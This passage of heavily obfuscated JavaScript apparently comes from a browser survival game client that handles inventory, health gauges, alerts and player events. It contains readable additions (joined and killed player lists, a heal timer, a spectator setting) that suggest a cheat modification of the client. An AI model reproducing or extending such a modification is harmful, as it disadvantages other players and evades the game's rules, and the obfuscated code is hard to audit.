				}
			};
			this.ᐃᐃΔᐃⵠᐃⵠⲆⲆ = function(ᐃΔ) {
				ᐃΔ === ᐃᐃ.ⵠᐃᐃⵠ ? (ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠⵠⵠⵠⵠΔⲆ(1, ΔⲆⲆ), ΔⵠⵠⲆ.ᐃⵠᐃⲆᐃⲆΔ()) : this.ᐃⵠⲆΔⲆΔⵠ([ΔⲆⲆ, ᐃΔ, ⵠΔᐃ]);
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃᐃᐃΔΔⲆᐃ()
			};
			this.ᐃΔΔⲆᐃⵠᐃⵠⲆ = function(ᐃΔ) {
				ᐃᐃΔ.ⵠⲆⵠᐃᐃ.ΔⲆΔⲆΔ = 0;
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠᐃⵠⲆⵠᐃΔᐃⵠ(ᐃΔ)
			};
			this.ⵠⵠΔᐃⲆᐃΔᐃⵠ = function(ᐃΔ) {
				var ᐃΔⵠⵠΔ = ⵠⲆⵠᐃΔ[ᐃΔ].r;
				for (var ⵠᐃ = 0; ᐃΔⵠⵠΔ.length > ⵠᐃ; ⵠᐃ++) {
					if (ᐃᐃΔ.ⲆⵠⲆⵠ.max > ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.length || ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃΔⵠⵠΔ[ⵠᐃ][0]] > ΔΔⵠ) {
						var ⲆΔⲆⲆ = Math.floor(.8 * ᐃΔⵠⵠΔ[ⵠᐃ][1]);
						if (!ⲆΔⲆⲆ) continue;
						this.ᐃⵠⲆΔⲆΔⵠ([Ⲇᐃᐃᐃ, ᐃΔⵠⵠΔ[ⵠᐃ][0], ⲆΔⲆⲆ])
					}
				}
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃᐃᐃΔΔⲆᐃ()
			};
			this.ⲆⵠⲆⵠⲆᐃⲆΔⲆ = function(ᐃΔ) {
				ᐃᐃΔ.ⵠⲆⵠᐃᐃ.ΔⲆΔⲆΔ = 0;
				ᐃᐃΔ.ⵠΔΔⲆ.ⲆⲆⲆΔⲆⵠⵠⵠΔ(ᐃΔ)
			};
			this.ⲆⲆⵠⲆⲆ = function(ᐃⲆᐃⵠ) {
				if (!ᐃᐃΔ.alert.text) ᐃᐃΔ.alert.text = ᐃⲆᐃⵠ;
				else if (ᐃⲆᐃⵠ !== ᐃᐃΔ.alert.text && ᐃⲆᐃⵠ !== ᐃᐃΔ.alert.list[ᐃᐃΔ.alert.list.length - ⵠⲆΔ]) ᐃᐃΔ.alert.list.push(ᐃⲆᐃⵠ)
			};
			this.ᐃᐃᐃᐃᐃⲆᐃⲆⲆ = function() {
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ᐃΔΔΔⵠⵠᐃ])
			};
			this.ⲆΔᐃⵠⵠⵠΔᐃⵠ = function() {
				var ᐃⲆᐃⵠ;
				if (0 == ᐃᐃΔ.ᐃΔⲆ) ᐃⲆᐃⵠ = ΔⵠΔ[ⲆⲆΔ.ᐃⲆᐃⲆⵠⲆᐃ];
				else ᐃⲆᐃⵠ = ΔⵠΔ[ⲆⲆΔ.ΔⵠⲆΔⵠᐃΔ] + (ᐃᐃΔ.ᐃΔⲆ + Ⲇᐃⵠ) + ΔⵠΔ[ⲆⲆΔ.ⲆⲆΔΔⲆᐃᐃ];
				this.ⲆⲆⵠⲆⲆ(ᐃⲆᐃⵠ);
				ᐃᐃΔ.ᐃΔⲆ++
			};
			this.ⵠⵠᐃⵠΔⵠᐃⲆⲆ = function() {
				clearTimeout(ᐃᐃᐃ.ⵠⲆᐃᐃⵠ);
				ᐃᐃΔ.reconnect.enabled = false;
				ᐃᐃΔ.ᐃⵠⵠΔΔ = false;
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ᐃΔᐃⲆᐃⵠⵠ]);
				ΔⵠⵠⲆ.ⵠΔΔΔᐃ(ⵠⲆᐃΔ.ⲆΔΔᐃⵠ);
				this.ΔⲆⲆΔ[ΔᐃⲆⵠⲆⵠΔ[87]]()
			};
			this.ⵠΔⲆᐃⵠⵠᐃΔΔ = function() {
				ⵠᐃⲆⵠⲆΔᐃ = ⵠΔⲆ;
				clearTimeout(this.ⵠⲆᐃᐃⵠ);
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ΔΔⵠⵠⲆⲆᐃ]);
				ⵠⲆᐃΔ.waiting = ᐃᐃΔᐃΔ
			};
			this.ⵠⵠΔⲆΔᐃΔⵠⲆ = function() {
				ⵠᐃⲆⵠⲆΔᐃ = ΔⵠΔⵠ;
				clearTimeout(this.ⵠⲆᐃᐃⵠ);
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ⵠᐃⵠⲆⵠΔΔ]);
				ⵠⲆᐃΔ.waiting = false
			};
			this.ⲆⵠᐃᐃᐃⵠΔᐃᐃ = function(ᐃⲆᐃⵠ) {
				var ᐃΔ = ᐃⲆᐃⵠ[1];
				var ᐃᐃᐃⵠ = ⲆⲆⲆ.ᐃᐃᐃⵠ;
				ᐃᐃᐃⵠ[ᐃΔ].ⵠΔⵠⲆᐃ = ᐃⲆᐃⵠ[Δᐃⵠⵠ];
				ᐃᐃᐃⵠ[ᐃΔ].ⲆⵠⲆᐃ = ᐃⲆᐃⵠ[ᐃⲆΔⵠ];
				ᐃᐃᐃⵠ[ᐃΔ].Δᐃᐃⵠᐃ = ᐃⲆᐃⵠ[ΔᐃⵠⵠⲆ];
				ᐃᐃᐃⵠ[ᐃΔ].ⲆΔⲆⲆⵠⲆΔ = ᐃⲆᐃⵠ[ΔⲆΔΔ];
				ᐃᐃᐃⵠ[ᐃΔ].ⵠⲆᐃⵠⵠ = ᐃⲆᐃⵠ[6];
				ᐃᐃᐃⵠ[ᐃΔ].ⲆᐃⲆⲆᐃ = ᐃⲆᐃⵠ[7];
				ᐃᐃᐃⵠ[ᐃΔ].ᐃⲆⵠΔⵠ = ᐃⲆᐃⵠ[8];
				ᐃᐃᐃⵠ[ᐃΔ].level = ᐃⲆᐃⵠ[9];
				ᐃᐃᐃⵠ[ᐃΔ].ᐃⵠᐃⵠⵠ = ΔⲆⵠⲆ;
				ᐃᐃᐃⵠ[ᐃΔ].ⲆⵠᐃⲆΔⵠⵠ = null;
				ᐃᐃᐃⵠ[ᐃΔ].label = null;
				ᐃᐃᐃⵠ[ᐃΔ].ᐃΔⲆΔᐃⲆⵠ = null;
				ᐃᐃᐃⵠ[ᐃΔ].ᐃⵠⵠΔΔ = true;
				if (ΔⵠᐃΔΔΔᐃ === ᐃⲆᐃ) ᐃᐃᐃⵠ[ᐃΔ].ⵠΔⵠⲆᐃ += "|" + ᐃΔ;
				setTimeout(() => {
								JoinedPlayers.unshift(ᐃᐃᐃⵠ[ᐃΔ].ⵠΔⵠⲆᐃ + " | " + ᐃΔ +  " | Level: " + ᐃᐃᐃⵠ[ᐃΔ].level);
				if (JoinedPlayers.length > 5) JoinedPlayers.pop()
				},750)

			};
			this.ΔⲆⲆΔⵠᐃΔΔᐃ = function() {
				Settings.Spectator.enabled || this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃΔΔⵠΔⵠ[ⲆΔᐃⵠᐃᐃⵠ].stringify([9]))
			};
			this.ᐃΔΔⵠΔΔᐃΔⵠ = function() {
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.EMPTY])
			};
			this.ⵠⵠᐃⵠᐃⲆΔ = function() {
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ΔᐃⲆᐃⲆⲆⲆ])
			};
			this.ⵠⵠᐃᐃΔⵠΔⵠΔ = function(ᐃΔ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⵠⲆⵠⲆⲆ[ⵠᐃⲆΔᐃᐃⵠ].stringify([38, ᐃΔ]));
				ᐃᐃΔ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = ⲆⲆᐃⵠᐃ
			};
			this.ΔⲆⲆΔΔΔⵠΔⵠ = function(ⵠᐃⲆⲆ) {
				var ᐃΔⵠⵠΔ = ⲆᐃⵠⲆⵠᐃⲆ[ⵠᐃⲆⲆ - 1].items;
				for (var ⵠᐃ = Ⲇᐃᐃᐃ; ᐃΔⵠⵠΔ.length > ⵠᐃ && ᐃᐃΔ.ⲆⵠⲆⵠ.max > ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.length; ⵠᐃ++) {
					var ΔΔΔⵠⵠ = ᐃΔⵠⵠΔ[ⵠᐃ][ⵠⲆΔ];
					var ⲆΔⲆⲆ = ᐃΔⵠⵠΔ[ⵠᐃ][0];
					if (ᐃΔⵠⵠΔ[ⵠᐃ][ΔⵠⲆΔ] === ᐃᐃ.ⵠᐃᐃⵠ) ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠⵠⵠⵠⵠΔⲆ(ΔΔᐃⵠ, 0);
					else this.ᐃⵠⲆΔⲆΔⵠ([0, ΔΔΔⵠⵠ, ⲆΔⲆⲆ])
				}
			};
			this.ᐃⵠⲆΔⲆΔⵠ = function(ⵠΔΔᐃᐃ) {
				var ΔⲆΔᐃⲆ = ⵠΔΔᐃᐃ.length;
				var ⲆⵠⲆⵠ = ᐃᐃΔ.ⲆⵠⲆⵠ;
				for (var ⵠᐃ = 1; ⵠᐃ < ΔⲆΔᐃⲆ; ⵠᐃ += 2) {
					var ᐃⲆΔ = ⵠΔΔᐃᐃ[ⵠᐃ];
					var ᐃⵠⵠⵠ = ⵠΔΔᐃᐃ[ⵠᐃ + ⵠΔⲆ];
					for (var ᐃⵠᐃⵠ = 0; ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.length > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
						if (ᐃⲆΔ == ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ[ᐃⵠᐃⵠ].id) {
							ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃⲆΔ] += ᐃⵠⵠⵠ;
							break
						}
					}
					if (ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.length == ᐃⵠᐃⵠ) {
						ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃⲆΔ] = ᐃⵠⵠⵠ;
						ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.push(ΔⵠⵠⲆ.ᐃⵠᐃ[ᐃⲆΔ]);
						ΔⵠⵠⲆ.ᐃⵠᐃⲆᐃⲆΔ()
					}
				}
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⲆᐃ()
			};
			this.ⲆΔⲆⵠ = function(ᐃⵠΔᐃⵠ, ⲆⲆⲆⵠⵠᐃⵠ, ΔΔⲆⲆᐃ, ᐃⵠⲆⲆΔⲆⵠ, ⲆⵠΔⵠᐃⲆᐃ, ΔⵠⵠⲆⲆ, ᐃΔⵠⲆᐃ) {
				if (Math.floor(11 - (Date.now() - Timers.HealTimer) / 1e3) < 5 || arguments[0] / 100 > ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⲆⵠΔ) {
					Timers.HealTimer = (new Date).getTime()
				}
				Timers.GaugeTimer = (new Date).getTime();
				ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⲆⵠΔ = ᐃⵠΔᐃⵠ / ᐃᐃⲆⲆⲆⲆⲆ;
				ᐃᐃΔ.ⲆΔⲆⵠ.ⵠⵠᐃ = ⲆⲆⲆⵠⵠᐃⵠ / ᐃᐃⲆⲆⲆⲆⲆ;
				ᐃᐃΔ.ⲆΔⲆⵠ.c = ΔΔⲆⲆᐃ / 100;
				ᐃᐃΔ.ⲆΔⲆⵠ.ΔᐃⲆ = ᐃⵠⲆⲆΔⲆⵠ / ⲆⵠᐃΔⲆ;
				ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⲆΔ = ⲆⵠΔⵠᐃⲆᐃ / ⵠᐃⲆΔΔ;
				ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⲆⵠΔΔⵠΔ = ΔⵠⵠⲆⲆ / 100;
				ᐃᐃΔ.ᐃΔⵠⲆᐃ = ᐃΔⵠⲆᐃ
			};
			this.ᐃΔΔⵠⵠⵠᐃᐃⵠ = function(ᐃΔ) {
				ΔⵠⵠⲆ.ᐃⲆᐃⲆ.modify(ᐃΔ, ᐃⲆⵠᐃΔ)
			};
			this.ⲆΔᐃᐃΔⲆⲆⲆⲆ = function(ᐃΔ) {
				ΔⵠⵠⲆ.ᐃⲆᐃⲆ.modify(ᐃΔ, Δᐃᐃᐃ)
			};
			this.claimed = function(ᐃΔ) {
				ΔⵠⵠⲆ.ᐃⲆᐃⲆ.modify(ᐃΔ, ⲆΔⵠⵠ)
			};
			this.ⲆᐃᐃⵠⲆΔᐃⵠⵠ = function(ᐃⵠΔᐃⵠ, ᐃΔⵠⲆᐃ) {
				ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⲆⵠΔ = ᐃⵠΔᐃⵠ / 100;
				ᐃᐃΔ.ᐃΔⵠⲆᐃ = ᐃΔⵠⲆᐃ
			};
			this.ᐃᐃᐃΔᐃⵠⲆⵠᐃ = function(ᐃⵠΔᐃᐃΔⵠ) {
				ᐃᐃΔ.ⲆΔⲆⵠ.ΔᐃⲆ = ᐃⵠΔᐃᐃΔⵠ / 100
			};
			this.ⵠᐃΔᐃΔᐃΔⵠⲆ = function(ⲆⲆⲆⵠⵠᐃⵠ) {
				ᐃᐃΔ.ⲆΔⲆⵠ.ⵠⵠᐃ = ⲆⲆⲆⵠⵠᐃⵠ / 100
			};
			this.ᐃⵠΔⲆᐃΔⲆⲆⵠ = function(ΔⵠⵠⲆⲆ) {
				ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⲆⵠΔΔⵠΔ = ΔⵠⵠⲆⲆ / 100
			};
			this.ᐃⵠⲆΔⲆⲆⵠⲆⲆ = function(ΔΔⲆⲆᐃ) {
				ᐃᐃΔ.ⲆΔⲆⵠ.c = ΔΔⲆⲆᐃ / 100
			};
			this.ⲆⵠᐃⲆⲆΔΔⵠᐃ = function(Δⵠⵠᐃ) {
				ⲆⲆⲆ.time = Δⵠⵠᐃ;
				ⲆⲆⲆ.transition = ⲆⲆΔⲆⲆ;
				ⲆⲆⵠⲆ.transition = ΔΔᐃⵠ
			};
			this.ⲆᐃⲆᐃΔⲆⵠΔᐃ = function() {
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[406]).style.backgroundColor = Ⲇ.ⲆⵠΔⲆᐃ[ⲆⲆⲆ.time]
			};
			this.ᐃⵠⵠᐃᐃΔΔⲆΔ = function(ᐃΔ) {
				if (ⲆⲆⲆ.mode == ΔᐃᐃΔ.ΔⵠⲆᐃⵠΔⵠ && ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃΔ].ⵠΔⵠⲆᐃ !== ⵠ[575]) this.ⲆⲆⵠⲆⲆ(ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃΔ].ⵠΔⵠⲆᐃ + ΔⵠΔ[ⲆⲆΔ.ΔᐃΔⲆᐃⲆⲆ]);
				ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃΔ].ᐃⵠⵠΔΔ = ⲆⲆᐃⵠᐃ;
				KilledPlayers.unshift(ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃΔ].ⵠΔⵠⲆᐃ + " | " + ᐃΔ + " | Level: " + ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃΔ].level);
				if (KilledPlayers.length > 5) KilledPlayers.pop()
			};
			this.ⵠⵠⲆⲆᐃᐃΔΔΔ = function(ΔⲆⵠΔ) {
				var ⵠΔΔᐃᐃ = new Uint16Array(ΔⲆⵠΔ);
				Settings.Spectator.enabled || ⵠΔⲆΔ.ⲆΔΔ.ⲆⲆᐃΔⲆ(ⵠΔΔᐃᐃ[ᐃⲆᐃ], ⵠΔΔᐃᐃ[ⵠⵠΔⲆ])
			};
			this.ΔΔⲆⲆΔΔⵠⲆᐃ = function(ΔⲆⵠΔ) {
				var ⵠΔΔᐃᐃ = new Uint16Array(ΔⲆⵠΔ);
				ᐃᐃΔ.ⲆΔΔ.ⲆⲆᐃΔⲆ(ⵠΔΔᐃᐃ[ᐃⲆᐃ], ⵠΔΔᐃᐃ[2])
			};
			this.ⲆΔᐃΔⲆⵠΔⲆᐃ = function(ⲆⲆⲆⵠ, ΔⲆⵠΔ) {
				var ⵠΔΔᐃᐃ = new Uint16Array(ΔⲆⵠΔ);
				var ΔⲆΔᐃⲆ = (ⲆⲆⲆⵠ.length - 2) / ⲆΔⵠᐃ;
				for (var ⲆⲆⵠΔ = 0; ⲆⲆⵠΔ < ΔⲆΔᐃⲆ; ⲆⲆⵠΔ++) {
					var ᐃΔ = ⵠΔΔᐃᐃ[1 + 2 * ⲆⲆⵠΔ];
					var ⲆⵠⵠΔ = ⲆⲆⲆⵠ[ⵠΔᐃΔ + 4 * ⲆⲆⵠΔ];
					var ⲆᐃΔ = (ⲆⲆⲆⵠ[5 + ⵠΔᐃΔ * ⲆⲆⵠΔ] >> ⵠᐃⵠΔ) / 127 * Math.PI * Ⲇⵠⵠᐃ;
					var ᐃᐃᐃΔ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ⲆⵠⵠΔ * ⲆⲆⲆ.ⵠᐃᐃⲆΔⲆΔ + ᐃΔ];
					if (ᐃᐃᐃΔ && ᐃᐃᐃΔ.Δᐃⵠ) {
						if (ⲆⲆⵠⲆ.loaded && ⲆⲆⵠⲆ.ⲆΔΔᐃⵠ) ⲆⲆⵠⲆ.Δᐃⵠ(ⲆⲆⲆⵠ[5 + 4 * ⲆⲆⵠΔ] & 1, ⵠⲆⲆΔⵠ[ᐃᐃᐃΔ.type], ᐃᐃᐃΔ.x, ᐃᐃᐃΔ.y);
						ᐃᐃᐃΔ.Δᐃⵠ.angle = ⲆᐃΔ;
						ᐃᐃᐃΔ.Δᐃⵠ.ⵠⲆᐃ = ⲆᐃΔ
					}
				}
			};
			this.ⲆΔⲆᐃⵠⵠⲆΔⲆ = function(ΔⲆⵠΔ) {
				var ⵠΔΔᐃᐃ = new Uint16Array(ΔⲆⵠΔ);
				var ΔⲆΔᐃⲆ = (ⵠΔΔᐃᐃ.length - 1) / 4;
				for (var ⲆⲆⵠΔ = 0; ΔⲆΔᐃⲆ > ⲆⲆⵠΔ; ⲆⲆⵠΔ++) {
					var ⵠᐃⲆⲆ = ⲆⲆⵠΔ * 4;
					var ⵠᐃ = ⵠΔΔᐃᐃ[1 + ⵠᐃⲆⲆ];
					var ᐃⵠᐃⵠ = ⵠΔΔᐃᐃ[2 + ⵠᐃⲆⲆ];
					var ⲆᐃΔ = 2 * ((ⵠΔΔᐃᐃ[Δⵠᐃⵠ + ⵠᐃⲆⲆ] >> ΔⲆⵠ) / 127 * Math.PI);
					var ᐃΔ = ⵠΔΔᐃᐃ[4 + ⵠᐃⲆⲆ];
					var ⵠᐃᐃᐃ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ᐃⵠᐃⵠ][ⵠᐃ];
					var ᐃⲆΔ;
					switch (ᐃΔ) {
						case 0:
							ᐃⲆΔ = ⵠᐃᐃᐃ["p"][0][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 1:
							ᐃⲆΔ = ⵠᐃᐃᐃ["s"][Δⵠᐃ][Δⵠᐃ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 2:
							ᐃⲆΔ = ⵠᐃᐃᐃ["s"][ᐃΔᐃⲆ][ΔᐃΔΔ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case ΔⲆᐃⲆ:
							ᐃⲆΔ = ⵠᐃᐃᐃ["s"][2][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case ΔΔⵠⵠΔ:
							ᐃⲆΔ = ⵠᐃᐃᐃ["t"][ⲆⲆⲆᐃ][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 5:
							ᐃⲆΔ = ⵠᐃᐃᐃ["t"][1][ΔⲆⲆ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 6:
							ᐃⲆΔ = ⵠᐃᐃᐃ["t"][ΔⵠⵠΔ][ⵠᐃⲆᐃ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ᐃⲆᐃᐃⲆ;
							break;
						case ᐃΔⲆΔᐃ:
							ᐃⲆΔ = ⵠᐃᐃᐃ["t"][3][Δᐃᐃⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ᐃΔᐃⵠΔ;
							break;
						case 8:
							ᐃⲆΔ = ⵠᐃᐃᐃ["t"][4][ⲆⲆⲆᐃ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ΔᐃⲆⵠⵠ;
							break;
						case 9:
							ᐃⲆΔ = ⵠᐃᐃᐃ["t"][ⲆⲆΔⵠ][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⵠᐃⲆᐃΔ;
							break;
						case 10:
							ᐃⲆΔ = ⵠᐃᐃᐃ["g"][0][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⲆᐃΔⲆⲆ;
							break;
						case ΔⲆⵠⲆΔΔᐃ:
							ᐃⲆΔ = ⵠᐃᐃᐃ["g"][ⲆⵠⲆⲆ][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 12:
							ᐃⲆΔ = ⵠᐃᐃᐃ["g"][ⵠΔⲆᐃ][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⲆⲆⲆΔⲆ;
							break;
						case ᐃΔⲆᐃⲆᐃⲆ:
							ᐃⲆΔ = ⵠᐃᐃᐃ["d"][0][ΔⲆⵠⲆ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case ⲆⲆΔΔⵠΔᐃ:
							ᐃⲆΔ = ⵠᐃᐃᐃ["d"][1][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⵠⵠⲆⲆΔ;
							break;
						case 15:
							ᐃⲆΔ = ⵠᐃᐃᐃ["d"][Ⲇⵠⵠᐃ][ΔⲆⲆ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ᐃⲆᐃᐃⲆ;
							break;
						case 16:
							ᐃⲆΔ = ⵠᐃᐃᐃ["b"][0][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⲆⵠⵠᐃⲆ;
							break;
						case ΔΔⲆΔᐃᐃᐃ:
							ᐃⲆΔ = ⵠᐃᐃᐃ["b"][1][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ΔᐃΔΔⵠ;
							break;
						case 18:
							ᐃⲆΔ = ⵠᐃᐃᐃ["b"][ᐃⲆΔⲆ][ᐃΔΔ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case ⲆⲆⵠΔⵠ:
							ᐃⲆΔ = ⵠᐃᐃᐃ["b"][3][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ΔᐃⲆⵠⵠ;
							break;
						case 20:
							ᐃⲆΔ = ⵠᐃᐃᐃ["f"][0][ΔⲆⲆ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 21:
							ᐃⲆΔ = ⵠᐃᐃᐃ["f"][1][ΔΔⵠⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⲆΔΔⲆΔ;
							break;
						case 22:
							ᐃⲆΔ = ⵠᐃᐃᐃ["f"][ΔⵠⵠΔ][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 23:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[456]][0][ⵠⲆᐃⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⲆᐃΔⲆⲆ;
							break;
						case 24:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[456]][ⵠΔⲆ][ⲆΔⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ΔΔⲆⲆΔ;
							break;
						case 25:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[456]][ⲆΔΔⵠ][Δⵠᐃ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ᐃⲆⲆᐃΔ;
							break;
						case 26:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[297]][ⵠᐃⲆᐃ][ᐃⵠⲆ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 27:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[297]][ΔⲆⵠ][ᐃⵠΔ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ᐃⵠΔᐃΔ;
							break;
						case 28:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[297]][Ⲇᐃᐃⵠ][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ᐃⲆⲆᐃΔ;
							break;
						case 29:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[70]][0][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 30:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[70]][1][ⵠΔⲆⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 31:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[70]][ⵠΔⲆᐃ][ᐃⵠⲆⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 32:
							ᐃⲆΔ = ⵠᐃᐃᐃ["a"][0][ⵠⲆᐃⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ᐃⲆⲆᐃΔ;
							break;
						case 33:
							ᐃⲆΔ = ⵠᐃᐃᐃ["a"][ᐃᐃⵠ][ᐃΔΔ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 34:
							ᐃⲆΔ = ⵠᐃᐃᐃ["a"][ⲆΔΔⵠ][ⵠΔⲆⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 35:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[568]][ⲆΔⵠ][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 36:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[568]][ⵠΔΔ][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 37:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[568]][2][ᐃΔΔ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⲆᐃΔⲆⲆ;
							break;
						case 38:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[568]][ⲆΔⵠⵠ][ᐃΔΔ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⵠᐃⲆᐃΔ;
							break;
						case 40:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[138]][ⲆΔⵠ][ΔΔⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 41:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[138]][1][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⵠⲆⲆⵠᐃ;
							break;
						case 42:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[138]][2][ΔΔⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ᐃⵠΔᐃΔ;
							break;
						case 50:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[196]][ⲆΔⵠ][ΔⲆⲆ];
